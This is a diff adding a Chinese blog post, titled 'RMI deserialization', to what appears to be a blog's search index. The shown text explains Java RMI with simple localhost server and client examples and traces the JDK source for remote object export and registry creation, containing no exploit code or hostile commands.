@@ -7498,4 +7498,1061 @@ public String toString() &#123;
         <tag>java</tag>
       </tags>
   </entry>
+  <entry>
+    <title>RMI反序列化</title>
+    <url>/2024/01/23/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h2 id="一、什么是-RMI"><a href="#一、什么是-RMI" class="headerlink" title="一、什么是 RMI"></a>一、什么是 RMI</h2><p>RMI是远程方法调用，RMI技术可以使一个java虚拟机中的对象去调用另一个java虚拟中的对象方法并获取调用结果。也就是说RMI实现了客户端调用服务端的对象方法像调用本地的对象方法。</p>
+<h2 id="二、RMI原理分析"><a href="#二、RMI原理分析" class="headerlink" title="二、RMI原理分析"></a>二、RMI原理分析</h2><p>既然是解决远程调用的问题，那么肯定要有client(客户端)和服务端(server)，也就是方法的调用者和被调用者，从客户端-服务器模型来看，客户端程序之间调用服务端，两者之间是通过JRMP协议实现的。</p>
+<p>这里简单了解一下JRMP协议，类似于HTTP协议，规定了客户端和服务端要满足的规范：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">JRMP（Java远程方法协议）可以定义为特定于Java的，基于流的协议，该协议查找并引用远程对象。它要求客户端和服务器都使用Java对象。它是线级协议，在RMI下和TCP / IP上运行。</span><br></pre></td></tr></table></figure></div>
+
+<p>下面通过流程图去进行RMI原理的分析：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230331150932626-442742960.png"
+                      alt="image-20230331150932629"
+                ></p>
+<p> RMI 客户端在调用远程方法时会先创建一个stub(sun.rmi.registry.RegistryImpl_Stub)也称为存根,Stub是RMI client的代理对象，Stub的主要功能是请求远程方法时构造一个信息块，然后通过RMI机制发送给客户端。</p>
+<p>stub构造的信息块由几个部分组成：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.远程对象标识符</span><br><span class="line">2.调用的方法描述</span><br><span class="line">3.编组后的参数值</span><br></pre></td></tr></table></figure></div>
+
+<p>Stub会Remote对象传递给客户端的远程引用层（java.rmi.server.RemoteRef）并创建远程调用对象（java.rmi.server.RemoteCall）</p>
+<p>Remotecall会对RMI的服务名称和Remote进行序列化，然后通过Socket连接的方式传输到服务端的远程应用层</p>
+<p>在上面我们看到client有一个stub构造信息块发送到服务端，那么在Skeleton就是在服务端接收这个信息的对象。</p>
+<p>Skeleton在接收到client传递来的信息块后调用Remotecall反序列化RMI客户端传过来的序列化</p>
+<p>然后Skeleton会处理客户端请求，调用相应服务端的对象进行调用，并将方法的返回值打包成响应消息并发送回客户端</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Skeleton 接收到客户端请求后，会调用远程对象方法并返回方法的执行结果。客户端不会直接访问远程对象，而是通过 Skeleton 间接访问远程对象。Skeleton 的作用是隐藏远程对象的实现细节，使客户端可以像调用本地对象一样调用远程对象。</span><br><span class="line">需要注意的是，当远程对象方法抛出异常时，Skeleton 会将异常打包成响应消息并发送回客户端。客户端需要处理这些异常，并根据需要采取相应的措施。</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="三、RMI代码实现"><a href="#三、RMI代码实现" class="headerlink" title="三、RMI代码实现"></a>三、RMI代码实现</h2><p>1、RMI服务端注册服务代码</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.anbai.sec.rmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class RMIServerTest &#123;</span><br><span class="line"></span><br><span class="line">    // RMI服务器IP地址</span><br><span class="line">    public static final String RMI_HOST = &quot;127.0.0.1&quot;;</span><br><span class="line"></span><br><span class="line">    // RMI服务端口</span><br><span class="line">    public static final int RMI_PORT = 9527;</span><br><span class="line"></span><br><span class="line">    // RMI服务名称</span><br><span class="line">    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 注册RMI端口</span><br><span class="line">            LocateRegistry.createRegistry(RMI_PORT);</span><br><span class="line"></span><br><span class="line">            // 绑定Remote对象</span><br><span class="line">            Naming.bind(RMI_NAME, new RMITestImpl());</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;RMI服务启动成功,服务地址:&quot; + RMI_NAME);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();//createRegistry() 或 bind() 方法抛出异常，则会在控制台上输出异常信息。</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>前几行代码定义了RMI服务的ip，端口以及名字</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(RMI_PORT);</span><br></pre></td></tr></table></figure></div>
+
+<p><code>LocateRegistry.createRegistry(RMI_PORT)</code> 是在 Java RMI 中创建 RMI 注册表的方法。它将在指定的 RMI 端口上启动 RMI 注册表，并返回一个对该注册表的远程引用。</p>
+<p>在JAVA RMI中RMI注册表是一种服务，在 RMI 中，客户端必须知道远程对象的位置（主机名和端口号），才能与之通信。RMI 注册表提供了一种机制，使客户端可以通过名称查找远程对象，而不必知道其位置。</p>
+<p>当你在 RMI 中启动一个远程对象时，你需要将其注册到 RMI  注册表中，以便客户端可以查找和访问它。这个注册代表着将远程对象绑定到一个名称上，这个名称可以被客户端用来查找远程对象。在 Java RMI  中，这个名称通常是一个字符串，被称为绑定名称 (binding name)。</p>
+<p>当客户端需要访问远程对象时，它可以使用 RMI 注册表来查找该对象。客户端使用绑定名称向 RMI 注册表发出请求，RMI 注册表会返回绑定名称所对应的远程对象的引用。然后客户端可以使用该引用来调用远程对象的方法。</p>
+<p>如果 RMI 注册表已经在指定的端口上运行，那么 <code>createRegistry()</code> 方法将不会创建新的注册表，而是返回对现有注册表的引用。如果你希望在另一个虚拟机上创建 RMI 注册表，可以使用 <code>LocateRegistry.getRegistry(host, port)</code> 方法来获取对远程 RMI 注册表的引用。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Naming.bind(RMI_NAME, new RMITestImpl());</span><br></pre></td></tr></table></figure></div>
+
+<p><code>Naming.bind()</code> 是 Java RMI 中用于将远程对象绑定到指定名称的方法。具体来说，它会将指定的远程对象绑定到一个指定的名称上，并将这个名称注册到 RMI 注册表中。这个名称可以用来在客户端中查找远程对象。</p>
+<p>使用 <code>Naming.bind()</code> 方法绑定远程对象时，需要指定一个 URL，该 URL 包含了 RMI 注册表的主机名、端口号和绑定名称。</p>
+<p>代码运行：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230406172913133-1458454200.png"
+                      alt="image-20230406172910934"
+                ></p>
+<p>2、RMITestImpl()类的实现</p>
+<p>在javaRMI中如果想将一个对象作为远程对象暴露给客户端使用，这个对象必须要满足以下要求：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、实现一个远程接口(即扩展java.rmi,Remote接口)</span><br><span class="line">2、必须是可序列化(即实现java.serializable接口)</span><br><span class="line">3、必须扩展 UnicastRemoteObject 类或 Activatable 类之一。</span><br></pre></td></tr></table></figure></div>
+
+<p><code>UnicastRemoteObject</code> 是一个抽象类，它实现了 <code>Remote</code> 接口，并提供了一些默认的远程方法实现。当一个类继承了 <code>UnicastRemoteObject</code> 类后，它就可以直接暴露为远程对象，客户端可以通过 RMI 协议访问这个对象。</p>
+<p>RMITestImpl()类代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.anbai.sec.rmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMITestImpl extends UnicastRemoteObject implements RMITestInterface &#123;</span><br><span class="line"></span><br><span class="line">    private static final long serialVersionUID = 1L;</span><br><span class="line"></span><br><span class="line">    protected RMITestImpl() throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * RMI测试方法</span><br><span class="line">     *</span><br><span class="line">     * @return 返回测试字符串</span><br><span class="line">     */</span><br><span class="line">    @Override</span><br><span class="line">    public String test() throws RemoteException &#123;</span><br><span class="line">        return &quot;Hello RMI~&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>远程接口RMITestInterface代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.anbai.sec.rmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * RMI测试接口</span><br><span class="line"> */</span><br><span class="line">public interface RMITestInterface extends Remote &#123;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * RMI测试方法</span><br><span class="line">     *</span><br><span class="line">     * @return 返回测试字符串</span><br><span class="line">     */</span><br><span class="line">    String test() throws RemoteException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在RMITestImpl 这段代码中，定义了一个RMITestImpl类，并实现了一个RMITestInterface接口，这个类的作用是将test()方法暴露为远程方法，以便客户端可以通过RMI协议调用它。在这个类中我们重写了<code>RMITestInterface</code> 接口中的 <code>test()</code> 方法，该方法返回了一个字符串hello Rmi 。由于这个类继承了UnicastRemoteObject 因此它可以直接暴露为远程对象，客户端可以通过 RMI 协议访问它。</p>
+<p>那么为什么要继承<code>UnicastRemoteObject</code> 类呢？</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">	1、这是因为 RMI 通过序列化和反序列化对象来进行远程通信。当客户端调用远程对象的方法时，它实际上是在向远程对象发送序列化后的方法调用请求。而远程对象接收到请求后，需要将序列化后的数据反序列化成方法调用，并执行这个方法。如果远程对象没有实现 UnicastRemoteObject 类，那么 RMI 将无法序列化和传输这个对象，也就无法将它暴露为远程对象。</span><br><span class="line">2、因此，为了让一个对象可以作为远程对象暴露给客户端使用，必须将它的类继承 UnicastRemoteObject 类，并实现一个远程接口。这样，RMI 就可以将这个对象序列化并传输到客户端，客户端就可以通过 RMI 协议访问这个对象了。</span><br><span class="line"></span><br><span class="line">3、UnicastRemoteObject 是一个抽象类，它实现了 Remote 接口，并提供了一些默认的远程方法实现。当一个类继承了 UnicastRemoteObject 类后，它就可以直接暴露为远程对象，客户端可以通过 RMI 协议访问这个对象。</span><br></pre></td></tr></table></figure></div>
+
+<p>由上面我们可以知道</p>
+<p>在 Java RMI 中，如果要将一个对象暴露为远程对象，这个对象必须实现一个远程接口。这个远程接口必须继承 <code>Remote</code> 接口，并且其中的所有方法都必须声明抛出 <code>RemoteException</code> 异常。这个远程接口定义了客户端可以通过 RMI 协议调用的方法。</p>
+<p>在这个示例代码中，<code>RMITestImpl</code> 类实现了一个名为 <code>RMITestInterface</code> 的远程接口。这个接口中只有一个方法 <code>test()</code>，它声明了抛出 <code>RemoteException</code> 异常。由于 <code>RMITestImpl</code> 类实现了 <code>RMITestInterface</code> 接口，因此它必须实现 <code>test()</code> 方法，并且在方法声明中也必须声明抛出 <code>RemoteException</code> 异常。</p>
+<p>3、客户端代码实现</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.anbai.sec.rmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.Naming;</span><br><span class="line"></span><br><span class="line">import static com.anbai.sec.rmi.RMIServerTest.RMI_NAME;</span><br><span class="line"></span><br><span class="line">public class RMIClientTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 查找远程RMI服务</span><br><span class="line">            RMITestInterface rt = (RMITestInterface) Naming.lookup(RMI_NAME);</span><br><span class="line"></span><br><span class="line">            // 调用远程接口RMITestInterface类的test方法</span><br><span class="line">            String result = rt.test();</span><br><span class="line"></span><br><span class="line">            // 输出RMI方法调用结果</span><br><span class="line">            System.out.println(result);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ol>
+<li>在 <code>RMIClientTest</code> 类中定义了一个 <code>main</code> 方法，用于启动客户端程序。</li>
+<li>在 <code>main</code> 方法中，通过调用 <code>Naming.lookup</code> 方法查找指定名称的远程对象，该名称在常量 <code>RMI_NAME</code> 中定义。</li>
+<li>通过将 <code>Naming.lookup</code> 方法的返回结果转换为 <code>RMITestInterface</code> 类型，获取了远程接口对象的引用 <code>rt</code>。</li>
+<li>通过调用 <code>rt</code> 对象的 <code>test</code> 方法，执行了远程接口的方法调用。</li>
+<li>将远程方法调用的返回值打印到控制台。</li>
+<li>在代码中使用了 <code>try-catch</code> 语句来捕获可能发生的异常，比如在远程调用时可能发生的 <code>RemoteException</code> 异常等。</li>
+</ol>
+<p>代码运行：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230406172955540-213647078.png"
+                      alt="image-20230406172954315"
+                ></p>
+<h2 id="四、源码分析"><a href="#四、源码分析" class="headerlink" title="四、源码分析"></a>四、源码分析</h2><p>在前面我们对RMI的调用流程进行了大概分析，我们这里看一下RMI服务的具体实现</p>
+<h3 id="1、远程对象创建"><a href="#1、远程对象创建" class="headerlink" title="1、远程对象创建"></a>1、远程对象创建</h3><p>我们这里看一下我们服务端的代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException &#123;</span><br><span class="line">        rmi hello = new RemoteClass();//创建远程对象</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);//创建注册表</span><br><span class="line">        registry.rebind(&quot;hello&quot;,hello);//将远程对象注册到注册表里面，并且设置值为hello</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>首先通过 <code>rmi hello = new RemoteClass();</code>创建一个远程对象</p>
+<p>这里远程对象就已经创建了，后面就是要分析如何将这个远程对象给发布出去</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231230225536970.png"
+                      alt="image-20231230225536970"
+                ></p>
+<p>这个远程对象类是继承了<code>UnicastRemoteObject</code>类。</p>
+<p><code>UnicastRemoteObject</code> 提供了导出远程对象的方法，它可以在 RMI 注册表中注册远程对象，并监听客户端的请求。当客户端请求调用远程对象的方法时，RMI 框架将通过网络将请求传递给远程对象。</p>
+<p>这里再创建远程对象处打一个断点，跟进分析一下远程对象的创建过程：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231230225852952.png"
+                      alt="image-20231230225852952"
+                ></p>
+<p>远程对象类继承了UnicastRemoteobject类，首先会到父类的构造函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231051943756.png"
+                      alt="image-20231231051943756"
+                ></p>
+<p>UnicastRemoteobject类的构造方法接受一个port参数，也就是端口，我们这里没有传入port参数的值的话，这里port参数的值就默认为0，这里就是将远程对象发布到一个端口上面，这里没有定义端口，那么就会发布到一个随机的端口。这里发布时远程调用对象的端口，所以不是我们在服务端定义的注册中心的端口1099。</p>
+<p>然后就会调用exportobject方法，也就是导出对象，这个方法就是我们发布远程对象的核心方法。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231052446658.png"
+                      alt="image-20231231052446658"
+                ></p>
+<p>在这个方法里面调用exportObject方法，接受两个参数一个obj，也就是我们的远程对象，然后还接受一个<code>new UnicastServerRef(port)</code></p>
+<p>obj是我们远程调用的具体实现，那么这个<code>new UnicastServerRef(port)</code>就是用来进行网络通信，处理网络请求的。</p>
+<p>我们这里跟进这个处理网络请求类，分析一下处理的逻辑：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231052838640.png"
+                      alt="image-20231231052838640"
+                ></p>
+<p>这里就是处理网络请求的核心，这里又实例化了一个LiveRef类，接受一个port参数</p>
+<p>继续跟进这个实例化类：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231053026156.png"
+                      alt="image-20231231053026156"
+                ></p>
+<p>调用了这个类的构造函数，传递了两个参数，一个id，一个端口，跟进看一下LiveRef类的构造函数分析处理逻辑。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231053138882.png"
+                      alt="image-20231231053138882"
+                ></p>
+<p>到这里还是进行了一次封装，我们继续跟进构造函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231053528713.png"
+                      alt="image-20231231053528713"
+                ></p>
+<p>到这里才是这个类的构造函数，前面进行了两次封装。</p>
+<p>这个类的构造函数接受三个参数，一个就是我们前面见到的id</p>
+<p>第二参数是一个endpoint参数</p>
+<p>我们可以回到上次封装，看一下这里传入的是什么参数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231053731966.png"
+                      alt="image-20231231053731966"
+                ></p>
+<p>endpoint参数传入的值是一个<code>TCPEndpoint.getLocalEndpoint(port)</code>，也就是调用了<code>TCPEndpoint</code>的<code>getLocalEndpoint</code>方法，跟进到这个类：</p>
+<p>首先我们这里先看一下这个类的构造方法：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231054205181.png"
+                      alt="image-20231231054205181"
+                ></p>
+<p>这个类构造方法接受主机地址，端口号这些。</p>
+<p>我们大概可以了解到这是一个处理网络请求的类，也就是说，这个类才是网络请求的处理类，Live是通过调用这个方法来进行网络处理的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231054344683.png"
+                      alt="image-20231231054344683"
+                ></p>
+<ul>
+<li><code>csf</code>：<code>RMIClientSocketFactory</code> 实例，用于创建客户端套接字。</li>
+<li><code>ssf</code>：<code>RMIServerSocketFactory</code> 实例，用于创建服务器套接字。</li>
+</ul>
+<p>这里就是基于给定的端口号和可能的套接字工厂实例创建一个本地 <code>TCPEndpoint</code> 对象。这样的本地端点通常在 RMI 服务端用于监听指定端口，以便远程客户端可以连接到该端口。</p>
+<p>我们这里回到LiveRef的构造方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231054756063.png"
+                      alt="image-20231231054756063"
+                ></p>
+<p>可以看到这个ep传递的就是TCPEndpoint</p>
+<p><code>TCPEndpoint.getLocalEndpoint(port)</code>获取到的值就是这个endpoint</p>
+<p>根据变量调试信息我们可以看到这里存储了ip地址，端口号</p>
+<p>分析到这里我们可以知道，网络请求的核心类是TCPEndpoint这个类，然后封装在LiveRef中进行网络请求的处理。</p>
+<p>然后步出，回到这个export0bject类</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231055300538.png"
+                      alt="image-20231231055300538"
+                ></p>
+<p>上面我们分析了new UnicastServerRef(port)的处理逻辑。</p>
+<p>我们这里跟进到export0bject方法中继续分析如何将远程对象发布出去。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231055538732.png"
+                      alt="image-20231231055538732"
+                ></p>
+<p>这个sref就是我们前面传入的new UnicastServerRef(port)。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231055630970.png"
+                      alt="image-20231231055630970"
+                ></p>
+<p>根据这个变量信息，可以知道其实还是封装的LiveRef。</p>
+<p>继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231230230016402.png"
+                      alt="image-20231230230016402"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; implClass = impl.getClass();</span><br></pre></td></tr></table></figure></div>
+
+<p>这里会先获取到要导出的远程对象的类</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br></pre></td></tr></table></figure></div>
+
+<p>然后通过<code>Util.createProxy</code>方法创建一个stub对象，这个stub就是我们在前面分析RMI的远程对象在客户端的代理，用于处理客户端对远程对象的方法调用。</p>
+<p>然后这里可以会有个疑问，stub不是客户端调用的吗，为什么是在服务端生成的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231060115189.png"
+                      alt="image-20231231060115189"
+                ></p>
+<p>根据这个图我们可以很清楚的理解，stub是由服务端生成，然后放到注册中心的，然后客户端根据要调用的远程对象，获取到这个stub，然后进行远程方法调用的处理。</p>
+<p>跟进到createProxy方法分析stub对象具体时怎么创建的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231230232701038.png"
+                      alt="image-20231230232701038"
+                ></p>
+<p>首先还是获取到远程对象类</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (forceStubUse ||</span><br><span class="line">    !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">&#123;</span><br><span class="line">    return createStub(remoteClass, clientRef);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后检查是否强制使用 Stub，如果强制使用 Stub，或者没有设置忽略 Stub 类，或者 Stub 类存在，就创建 Stub 对象。</p>
+<p>继续向下分析</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">final ClassLoader loader = implClass.getClassLoader();</span><br><span class="line">      final Class&lt;?&gt;[] interfaces = getRemoteInterfaces(implClass);</span><br><span class="line">      final InvocationHandler handler =</span><br><span class="line">          new RemoteObjectInvocationHandler(clientRef);</span><br></pre></td></tr></table></figure></div>
+
+<p>如果不使用 Stub，就准备创建代理对象。获取类加载器、远程接口数组以及远程对象调用处理器。 RemoteObjectInvocationHandler 来为我们测试写的 RemoteObject 实现的 RemoteInterface 接口创建动态代理。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231230233740145.png"
+                      alt="image-20231230233740145"
+                ></p>
+<p>然后这里创建动态代理对象传入了加载器，远程接口，以及handler</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231061050260.png"
+                      alt="image-20231231061050260"
+                ></p>
+<p>根据变量调试信息可以看到这个handler封装的还是LiveRef类用来处理网络请求的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231061239308.png"
+                      alt="image-20231231061239308"
+                ></p>
+<p>前面创建了stub后，这里创建了一个Target对象，传入的参数都是我们前面创建的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231061334290.png"
+                      alt="image-20231231061334290"
+                ></p>
+<p>我们可以跟进去看一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231061650374.png"
+                      alt="image-20231231061650374"
+                ></p>
+<p>这里Target可以理解为一个总的封装，就是将前面创建的stub代理，远程方法对象之类的给封装起来。</p>
+<p>然后这里有一个点，可以了解一下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231061815242.png"
+                      alt="image-20231231061815242"
+                ></p>
+<p>可以看到服务端引用对象和客户端代理对象的LIveRef和id都是一样的，这是因为客户端和服务端通信，都是用的这个LIveRef来进行处理的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231062029593.png"
+                      alt="image-20231231062029593"
+                ></p>
+<p>然后这里会调用export0bject将封装好的target对象给发布出去</p>
+<p>跟进到这个exportObject方法：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231062403183.png"
+                      alt="image-20231231062403183"
+                ></p>
+<p>调用listen()监听端口</p>
+<p>跟进这个方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231062534084.png"
+                      alt="image-20231231062534084"
+                ></p>
+<p>首先会获取到远程对象的ip和端口，然后通过newServerSocket()创建一个套接字</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231062637501.png"
+                      alt="image-20231231062637501"
+                ></p>
+<p>然后后面就是创建了一个线程，当有连接执行这个线程。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231062916507.png"
+                      alt="image-20231231062916507"
+                ></p>
+<p>然后就是在创建这个套接字对象的时候，就会给我们的远程对象分配一个随机的端口。</p>
+<p>然后到这里就是已经给这个远程调用对象给发布到一个随机的端口上面了。</p>
+<p>但是发布出去之后，客户端时不知道的，所以我们这里还有记录一下这个地址。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231063350792.png"
+                      alt="image-20231231063350792"
+                ></p>
+<p>跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231063448761.png"
+                      alt="image-20231231063448761"
+                ></p>
+<p>第一个方法就是简单的赋值，我们直接跟进到第二个方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231063541174.png"
+                      alt="image-20231231063541174"
+                ></p>
+<p>前面都是一些处理</p>
+<p>继续往下面跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231063619255.png"
+                      alt="image-20231231063619255"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20231231063912701.png"
+                      alt="image-20231231063912701"
+                ></p>
+<p>objTable和implTable都是定义的静态的Map表，用来存储我们发布出去的远程对象。</p>
+<p>那么到这里远程对象的创建和发布就分析完了。</p>
+<h3 id="2、注册中心创建与绑定"><a href="#2、注册中心创建与绑定" class="headerlink" title="2、注册中心创建与绑定"></a>2、注册中心创建与绑定</h3><p>前面我们分析了远程对象的创建与发布，这里我们分析一些，注册中心的创建，以及远程对象的绑定。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231064209355.png"
+                      alt="image-20231231064209355"
+                ></p>
+<p>跟进这个创建注册中心的代码逻辑：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231231064308764.png"
+                      alt="image-20231231064308764"
+                ></p>
+<p>我们是调用createRegistry方法来创建这个注册中心</p>
+<p>然后这里实例化了 RegistryImpl类，并传入了端口，这里的端口参数的值是我们设置的，默认就是1099</p>
